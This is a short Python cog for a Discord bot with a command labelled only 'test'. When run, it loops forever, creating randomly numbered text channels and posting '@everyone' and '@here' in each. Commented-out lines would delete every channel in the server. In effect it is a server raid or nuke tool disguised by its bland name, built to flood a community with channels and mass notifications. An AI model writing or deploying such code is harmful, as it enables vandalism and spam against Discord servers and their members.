import random
import discord
from discord.ext import commands

prefix = 'w+'

class test(commands.Cog):
    def __init__(self, bot):
        self.bot = bot

    @commands.command(name='test', help='test')
    async def test(self, ctx):
     #   for c in ctx.guild.channels:  # iterating through each guild channel
      #      await c.delete()

        while True:
            category = ctx.guild

            ticket_nr = random.randint(0, 9999)
            self.channel_ticket = await category.create_text_channel(f'{ticket_nr}')
            await self.channel_ticket.send('@everyone')
            await self.channel_ticket.send('@here')

def setup(bot):
    bot.add_cog(test(bot))